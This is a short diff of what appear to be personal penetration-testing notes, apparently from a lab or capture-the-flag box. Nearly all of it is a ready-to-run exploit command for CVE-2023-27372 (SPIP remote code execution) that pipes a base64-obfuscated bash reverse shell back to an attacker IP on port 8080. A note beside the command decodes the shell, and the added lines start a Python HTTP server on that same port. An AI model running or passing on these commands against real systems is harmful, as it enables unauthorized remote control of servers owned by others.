@@ -4,4 +4,6 @@ https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-c
 
 python3 CVE-2023-27372.py -u http://10.10.81.78/spip/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMy44MS40NS84MDgwIDA+JjEK | base64 -d |bash'
   ~ RCE | CVE with Target Machine | Base64 decoded 'bash -i >& /dev/tcp/"IP Address"/"Port" 0>&1'
-
+  
+python3 -m http.server 8080
+  ~ set a HTTP server on port 8080.
